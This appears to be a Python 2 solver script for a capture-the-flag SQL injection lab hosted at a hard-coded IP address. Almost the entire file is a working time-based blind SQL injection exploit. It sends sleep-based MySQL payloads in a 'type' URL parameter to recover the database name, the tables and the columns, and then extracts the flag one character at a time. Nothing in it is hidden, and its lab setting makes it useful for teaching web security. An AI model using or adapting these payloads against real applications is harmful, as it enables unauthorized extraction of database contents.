# -*- coding: utf-8 -*-
#/usr/bin/env python

import requests
import string
import os
from signal import SIGINT, signal
import time

GREEN = '\x1b[92m'
RED = '\x1b[31m'
BOLD = '\x1b[1m'
BLINK = '\x1b[5m'
END = '\x1b[0m'
DELETE = '\x1b[2K\r'


URL = "http://167.172.164.187:8001/lesson-02/challenge-202/index.php"

def sig_handler(signal_number, interrupted_stack_frame):
	print BOLD+RED+"\nAborting.."+END
	exit(0)


def check_term_size():
    rows, columns = os.popen('/bin/stty size', 'r').read().split()
    return int(columns) >= 105


def banner():
    print ""
    print "┌─┐┌─┐┌─┐┌─┐┬┌┬┐┌─┐    ┌─┐┌─┐┬─┐┌─┐   ┌┬┐┌─┐┬ ┬"
    print "│  │ │├─┘├─┘│ │ │ │    ┌─┘├┤ ├┬┘│ │    ││├─┤└┬┘"
    print "└─┘└─┘┴  ┴  ┴ ┴ └─┘────└─┘└─┘┴└─└─┘────┴┘┴ ┴ ┴ "
    print ""
    print " ██████╗██╗  ██╗ █████╗ ██╗     ██╗     ███████╗███╗   ██╗ ██████╗ ███████╗    ██████╗  ██████╗ ██████╗ "
    print "██╔════╝██║  ██║██╔══██╗██║     ██║     ██╔════╝████╗  ██║██╔════╝ ██╔════╝    ╚════██╗██╔═████╗╚════██╗"
    print "██║     ███████║███████║██║     ██║     █████╗  ██╔██╗ ██║██║  ███╗█████╗█████╗ █████╔╝██║██╔██║ █████╔╝"
    print "██║     ██╔══██║██╔══██║██║     ██║     ██╔══╝  ██║╚██╗██║██║   ██║██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ "
    print "╚██████╗██║  ██║██║  ██║███████╗███████╗███████╗██║ ╚████║╚██████╔╝███████╗    ███████╗╚██████╔╝███████╗"
    print " ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝"
    print ""


def getDBNameLen():
    i = 1
    while True:
        PARAMS = {"type":"SQLi' and if(length(database()) = "+str(i)+",sleep(2),false)-- -"}
        start = time.time()
        r = requests.get(url = URL, params = PARAMS)
        end = time.time() - start
        if end > 3:
            return i
        i += 1


def getDBname(len):
    dbname = ''
    for i in range(1,len+1):
        for j in string.printable:
            if j not in ['\'']:
                PARAMS = {"type":"SQLi' and if((select substring(database(),"+str(i)+",1))='"+j+"',sleep(2),false)-- -"}
                start = time.time()
                r = requests.get(url = URL, params = PARAMS)
                end = time.time() - start
                if end > 3:
                    dbname += j
                    os.write(1,j)
                    break
    os.write(1,DELETE)
    return dbname

def getDBNumberOfTables(db):
    i = 1
    while True:
        PARAMS = {"type":"SQLi' and if((select count(table_name) from information_schema.tables where table_schema = '"+db+"') = "+str(i)+",sleep(2),false)-- -"}
        start = time.time()
        r = requests.get(url = URL, params = PARAMS)
        end = time.time() - start
        if end > 3:
            return i
        i += 1

def getDBTables(numTables,db):
    tables = []
    for k in range(numTables):
        tableName = ''
        len = 0
        while True:
            PARAMS = {"type":"SQLi' and if((select length(table_name) from information_schema.tables where table_schema = '"+db+"' limit 1 offset "+str(k)+") = "+str(len)+",sleep(2),false)-- -"}
            start = time.time()
            r = requests.get(url = URL, params = PARAMS)
            end = time.time() - start
            if end > 3:
                break
            len += 1


        for i in range(1,len+1):
             for j in string.printable:
                 if j not in ['\'']:
                     PARAMS = {"type":"SQLi' and if((select substring(table_name,"+str(i)+",1) from information_schema.tables where table_schema = '"+db+"' limit 1 offset "+str(k)+" )='"+j+"',sleep(2),false)-- -"}
                     start = time.time()
                     r = requests.get(url = URL, params = PARAMS)
                     end = time.time() - start
                     if end > 3:
                         tableName += j
                         os.write(1,j)
                         break
        os.write(1,DELETE)
        tables.append(tableName)
    return tables


def getDBTablesColumns(tables,dbName):
    cols = {}
    for table in tables:
        cols[table] = []
        numCol = 1
        while True:
            PARAMS = {"type":"SQLi' and if((select count(column_name) from information_schema.columns where table_schema = '"+dbName+"' AND table_name = '"+table+"') = "+str(numCol)+",sleep(2),false)-- -"}
            start = time.time()
            r = requests.get(url = URL, params = PARAMS)
            end = time.time() - start
            if end > 3:
                break
            numCol += 1
        for t in range(numCol):
            len = 0
            while True:
                PARAMS = {"type":"SQLi' and if((select length(column_name) from information_schema.columns where table_schema = '"+dbName+"' AND table_name = '"+table+"' limit 1 offset "+str(t)+" )='"+str(len)+ "',sleep(2),false)-- -"}
                start = time.time()
                r = requests.get(url = URL, params = PARAMS)
                end = time.time() - start
                if end > 3:
                    break
                len += 1

            colsName = ''
            for i in range(1,len+1):
                for j in string.printable:
                    if j not in ['\'']:
                        PARAMS = {"type":"SQLi' and if((select substring(column_name,"+str(i)+",1) from information_schema.columns where table_schema = '"+dbName+"' AND table_name = '"+table+"' limit 1 offset "+str(t)+" )='"+j+ "',sleep(2),false)-- -"}
                        start = time.time()
                        r = requests.get(url = URL, params = PARAMS)
                        end = time.time() - start
                        if end > 3:
                            colsName += j
                            os.write(1,j)
                            break
            os.write(1,DELETE)
            cols[table].append(colsName)
    return cols

def getFlag(table, column):
    len = 0
    while True:
        PARAMS = {"type":"SQLi' and if((select length("+column+") from "+table+" limit 1 offset 0) = "+str(len)+",sleep(2),false)-- -  "}
        start = time.time()
        r = requests.get(url = URL, params = PARAMS)
        end = time.time() - start
        if end > 3:
            break
        len += 1
    flag = ''
    for i in range(1,len+1):
        for j in string.printable:
            if j not in ['\'']:
                PARAMS = {"type":"SQLi' and if((select substring("+column+","+str(i)+",1) from "+table+" limit 1 offset 0)='"+j+ "',sleep(2),false)-- -"}
                start = time.time()
                r = requests.get(url = URL, params = PARAMS)
                end = time.time() - start
                if end > 3:
                    flag += j
                    os.write(1,j)
                    break
    os.write(1,DELETE)
    return flag



signal(SIGINT, sig_handler)

if check_term_size():
    banner()

len = getDBNameLen()
print BOLD+"[+] Current database name length: "+GREEN+str(len)+END

dbName = getDBname(len)
print BOLD+"[+] Current database name: "+GREEN+dbName+END

numTables = getDBNumberOfTables(dbName)
print BOLD+"[+] Number of "+dbName+" tables: "+GREEN+str(numTables)+END

tables = getDBTables(numTables,dbName)
print BOLD+"[+] "+dbName+" tables: "+GREEN+", ".join(tables)+END


columns = getDBTablesColumns(tables,dbName)
print BOLD+"[+] Tables with columns: "
for tab in columns.keys():
    print "\t"+tab+": "+GREEN+", ".join(columns[tab])+END

#table = vulns , column = flag

flag = getFlag("vulns", "flag")
print BOLD+"[+] FLAG: "+GREEN+BLINK+str(flag)+END
